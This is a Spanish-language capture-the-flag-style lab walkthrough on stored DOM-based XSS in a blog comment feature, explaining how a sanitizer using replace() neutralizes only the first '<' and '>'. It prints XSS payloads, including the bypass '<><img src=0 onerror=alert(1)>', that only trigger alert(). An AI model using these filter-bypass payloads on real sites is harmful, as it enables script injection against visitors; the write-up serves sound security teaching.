# 12. XSS DOM Almacenado

## 🌐 XSS DOM almacenado

### 📄 Descripción del laboratorio

Este laboratorio presenta una vulnerabilidad de **DOM-based Stored XSS** en la funcionalidad de comentarios del blog.

El comentario malicioso se **almacena en el servidor**, pero el problema real ocurre cuando el navegador de los usuarios procesa ese contenido de forma insegura mediante JavaScript del lado cliente.

🎯 **Objetivo del laboratorio:**

* Aprovechar la vulnerabilidad para ejecutar la función `alert()`.

***

### 📚 Teoría

Este laboratorio combina varios conceptos importantes:

```
Stored XSS
DOM-based processing
Filtros mal implementados
```

El flujo vulnerable funciona así:

```
1. El usuario envía un comentario
2. El servidor almacena el comentario
3. El frontend aplica una función de "sanitización"
4. El contenido se inserta en el DOM
5. El navegador interpreta el HTML resultante
```

A primera vista parece que existe una protección contra XSS.

La aplicación intenta neutralizar caracteres peligrosos:

```
<  →  &lt;
>  →  &gt;
```

El problema está en **cómo se implementa esa protección**.

El código utiliza una función similar a:

```javascript
replace()
```

En lugar de usar:

```java
replaceAll()
```

Esto significa que **solo se reemplaza la primera aparición** de cada carácter.

Ejemplo conceptual del fallo:

```javascript
input.replace('<','&lt;')
```

Esto provoca que:

```
solo el primer < se neutraliza
el resto permanece intacto
```

Este tipo de error es muy común porque:

```
el desarrollador cree haber filtrado el input
las pruebas básicas parecen funcionar
pero el filtro es incompleto
```

Además, el impacto es mayor porque se trata de **XSS almacenado**:

```
el payload se guarda en el servidor
se ejecuta cada vez que alguien ve el comentario
no requiere interacción adicional del atacante
```

***

### 📝 Práctica

#### 1️⃣ Probar un XSS clásico

Accedemos a una entrada del blog y enviamos un comentario con el payload típico:

```html
<script>alert(1)</script>
```

<figure><img src="../../../.gitbook/assets/image (1038).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (1039).png" alt=""><figcaption></figcaption></figure>

Resultado:

* El comentario aparece alterado.
* El script no se ejecuta.

Esto indica que existe algún tipo de sanitización.

***

#### 2️⃣ Analizar el comportamiento del filtro

Inspeccionando el código del frontend observamos que:

```
se usa replace() para < y >
solo la primera aparición se reemplaza
```

<figure><img src="../../../.gitbook/assets/image (1040).png" alt=""><figcaption></figcaption></figure>

Esto confirma que el filtro es **parcial**.

***

#### 3️⃣ Bypass del filtro

La estrategia consiste en **saturar el filtro**.

La idea es:

```
1. introducir caracteres < > de relleno
2. el filtro reemplaza esos primeros caracteres
3. el payload real queda intacto
```

Probamos el payload:

```html
<><script>alert(1)</script>
```

<figure><img src="../../../.gitbook/assets/image (1041).png" alt=""><figcaption></figcaption></figure>

Resultado:

El `<script>` aún no se ejecuta correctamente.

Esto indica que el contexto del HTML sigue limitando la ejecución.

***

#### 4️⃣ Usar un vector alternativo

En lugar de usar `<script>`, utilizamos un **event handler HTML**, que suele ser más flexible.

Payload final:

```html
<><img src=0 onerror=alert(1)>
```

<figure><img src="../../../.gitbook/assets/image (1042).png" alt=""><figcaption></figcaption></figure>

Funcionamiento:

```
<><        → el filtro neutraliza estos caracteres
<img ...>  → queda intacto
src=0      → provoca error de carga
onerror    → ejecuta alert(1)
```

***

#### 5️⃣ Ejecutar el XSS

Después de enviar el comentario:

1. Recargamos la página del blog.
2. El comentario se renderiza.
3. El navegador intenta cargar la imagen.
4. La carga falla.
5. Se ejecuta `alert(1)`.

Esto confirma que el **Stored DOM XSS es explotable**.

El laboratorio se marca como completado.

<figure><img src="../../../.gitbook/assets/image (1043).png" alt=""><figcaption></figcaption></figure>

***

#### 6️⃣ Resultado

Se consigue:

```
Bypass del filtro incompleto
Inyección de HTML malicioso
Ejecución de JavaScript mediante onerror
```

**Laboratorio resuelto.**
